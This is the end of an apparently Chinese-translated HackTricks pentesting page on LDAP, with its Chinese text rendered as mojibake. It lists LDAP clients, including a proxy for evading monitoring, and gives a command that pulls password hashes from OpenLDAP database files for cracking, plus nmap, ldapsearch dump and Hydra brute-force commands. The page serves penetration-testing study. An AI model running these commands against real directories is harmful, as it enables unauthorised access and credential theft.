<h2 id="å›¾å½¢ç•Œé¢"><a class="header" href="#å›¾å½¢ç•Œé¢">å›¾å½¢ç•Œé¢</a></h2>
<h3 id="apache-directory"><a class="header" href="#apache-directory">Apache Directory</a></h3>
<p><a href="https://directory.apache.org/studio/download/download-linux.html"><strong>ä»è¿™é‡Œä¸‹è½½ Apache Directory</strong></a>ã€‚ä½ å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°<a href="https://www.youtube.com/watch?v=VofMBg2VLnw&amp;t=3840s">å¦‚ä½•ä½¿ç”¨è¿™ä¸ªå·¥å…·çš„ç¤ºä¾‹</a>ã€‚</p>
<h3 id="jxplorer"><a class="header" href="#jxplorer">jxplorer</a></h3>
<p>ä½ å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½å¸¦æœ‰ LDAP æœåŠ¡å™¨çš„å›¾å½¢ç•Œé¢ï¼š<a href="http://www.jxplorer.org/downloads/users.html">http://www.jxplorer.org/downloads/users.html</a></p>
<p>é»˜è®¤å®‰è£…åœ¨ï¼š <em>/opt/jxplorer</em></p>
<p><img src="../.gitbook/assets/image%20(482).png" alt="" /></p>
<h3 id="godap"><a class="header" href="#godap">Godap</a></h3>
<p>Godap æ˜¯ä¸€ä¸ªç”¨äº LDAP çš„äº¤äº’å¼ç»ˆç«¯ç”¨æˆ·ç•Œé¢ï¼Œå¯ä»¥ç”¨æ¥ä¸ AD å’Œå…¶ä»– LDAP æœåŠ¡å™¨ä¸­çš„å¯¹è±¡å’Œå±æ€§è¿›è¡Œäº¤äº’ã€‚å®ƒé€‚ç”¨äº Windowsã€Linux å’Œ MacOSï¼Œæ”¯æŒç®€å•ç»‘å®šã€pass-the-hashã€pass-the-ticket å’Œ pass-the-certï¼Œä»¥åŠå…¶ä»–ä¸€äº›ä¸“é—¨åŠŸèƒ½ï¼Œå¦‚æœç´¢/åˆ›å»º/æ›´æ”¹/åˆ é™¤å¯¹è±¡ã€ä»ç»„ä¸­æ·»åŠ /ç§»é™¤ç”¨æˆ·ã€æ›´æ”¹å¯†ç ã€ç¼–è¾‘å¯¹è±¡æƒé™ (DACLs)ã€ä¿®æ”¹ Active-Directory é›†æˆ DNS (ADIDNS)ã€å¯¼å‡ºä¸º JSON æ–‡ä»¶ç­‰ã€‚</p>
<p><img src="../.gitbook/assets/godap.png" alt="" /></p>
<p>ä½ å¯ä»¥åœ¨ <a href="https://github.com/Macmod/godap">https://github.com/Macmod/godap</a> è®¿é—®å®ƒã€‚æœ‰å…³ä½¿ç”¨ç¤ºä¾‹å’Œè¯´æ˜ï¼Œè¯·é˜…è¯» <a href="https://github.com/Macmod/godap/wiki">Wiki</a>ã€‚</p>
<h3 id="ldapx"><a class="header" href="#ldapx">Ldapx</a></h3>
<p>Ldapx æ˜¯ä¸€ä¸ªçµæ´»çš„ LDAP ä»£ç†ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥å’Œè½¬æ¢æ¥è‡ªå…¶ä»–å·¥å…·çš„ LDAP æµé‡ã€‚å®ƒå¯ä»¥ç”¨æ¥æ¨¡ç³ŠåŒ– LDAP æµé‡ï¼Œä»¥å°è¯•ç»•è¿‡èº«ä»½ä¿æŠ¤å’Œ LDAP ç›‘æ§å·¥å…·ï¼Œå¹¶å®ç°äº†åœ¨ <a href="https://www.youtube.com/watch?v=mKRS5Iyy7Qo">MaLDAPtive</a> æ¼”è®²ä¸­æå‡ºçš„å¤§å¤šæ•°æ–¹æ³•ã€‚</p>
<p><img src="../.gitbook/assets/ldapx.png" alt="" /></p>
<p>ä½ å¯ä»¥ä» <a href="https://github.com/Macmod/ldapx">https://github.com/Macmod/ldapx</a> è·å–å®ƒã€‚</p>
<h2 id="é€šè¿‡-kerberos-è¿›è¡Œèº«ä»½éªŒè¯"><a class="header" href="#é€šè¿‡-kerberos-è¿›è¡Œèº«ä»½éªŒè¯">é€šè¿‡ kerberos è¿›è¡Œèº«ä»½éªŒè¯</a></h2>
<p>ä½¿ç”¨ <code>ldapsearch</code> ä½ å¯ä»¥ <strong>é€šè¿‡ kerberos è¿›è¡Œèº«ä»½éªŒè¯</strong>ï¼Œè€Œä¸æ˜¯é€šè¿‡ <strong>NTLM</strong>ï¼Œä½¿ç”¨å‚æ•° <code>-Y GSSAPI</code></p>
<h2 id="post"><a class="header" href="#post">POST</a></h2>
<p>å¦‚æœä½ å¯ä»¥è®¿é—®åŒ…å«æ•°æ®åº“çš„æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨ <em>/var/lib/ldap</em> ä¸­ï¼‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å“ˆå¸Œï¼š</p>
<pre><code class="language-bash">cat /var/lib/ldap/*.bdb | grep -i -a -E -o "description.*" | sort | uniq -u
</code></pre>
<p>æ‚¨å¯ä»¥å°†å¯†ç å“ˆå¸Œï¼ˆä» '{SSHA}' åˆ° 'structural'ï¼Œä¸æ·»åŠ  'structural'ï¼‰æä¾›ç»™ johnã€‚</p>
<h3 id="é…ç½®æ–‡ä»¶"><a class="header" href="#é…ç½®æ–‡ä»¶">é…ç½®æ–‡ä»¶</a></h3>
<ul>
<li>ä¸€èˆ¬</li>
<li>containers.ldif</li>
<li>ldap.cfg</li>
<li>ldap.conf</li>
<li>ldap.xml</li>
<li>ldap-config.xml</li>
<li>ldap-realm.xml</li>
<li>slapd.conf</li>
<li>IBM SecureWay V3 æœåŠ¡å™¨</li>
<li>V3.sas.oc</li>
<li>Microsoft Active Directory æœåŠ¡å™¨</li>
<li>msadClassesAttrs.ldif</li>
<li>Netscape ç›®å½•æœåŠ¡å™¨ 4</li>
<li>nsslapd.sas_at.conf</li>
<li>nsslapd.sas_oc.conf</li>
<li>OpenLDAP ç›®å½•æœåŠ¡å™¨</li>
<li>slapd.sas_at.conf</li>
<li>slapd.sas_oc.conf</li>
<li>Sun ONE ç›®å½•æœåŠ¡å™¨ 5.1</li>
<li>75sas.ldif</li>
</ul>
<h2 id="hacktricks-è‡ªåŠ¨å‘½ä»¤"><a class="header" href="#hacktricks-è‡ªåŠ¨å‘½ä»¤">HackTricks è‡ªåŠ¨å‘½ä»¤</a></h2>
<pre><code>Protocol_Name: LDAP    #Protocol Abbreviation if there is one.
Port_Number:  389,636     #Comma separated if there is more than one.
Protocol_Description: Lightweight Directory Access Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for LDAP
Note: |
The use of LDAP (Lightweight Directory Access Protocol) is mainly for locating various entities such as organizations, individuals, and resources like files and devices within networks, both public and private. It offers a streamlined approach compared to its predecessor, DAP, by having a smaller code footprint.

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Entry_2:
Name: Banner Grab
Description: Grab LDAP Banner
Command: nmap -p 389 --script ldap-search -Pn {IP}

Entry_3:
Name: LdapSearch
Description: Base LdapSearch
Command: ldapsearch -H ldap://{IP} -x

Entry_4:
Name: LdapSearch Naming Context Dump
Description: Attempt to get LDAP Naming Context
Command: ldapsearch -H ldap://{IP} -x -s base namingcontexts

Entry_5:
Name: LdapSearch Big Dump
Description: Need Naming Context to do big dump
Command: ldapsearch -H ldap://{IP} -x -b "{Naming_Context}"

Entry_6:
Name: Hydra Brute Force
Description: Need User
Command: hydra -l {Username} -P {Big_Passwordlist} {IP} ldap2 -V -f
</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-264-check-point-firewall-1.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/ipsec-ike-vpn-pentesting.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-264-check-point-firewall-1.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/ipsec-ike-vpn-pentesting.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
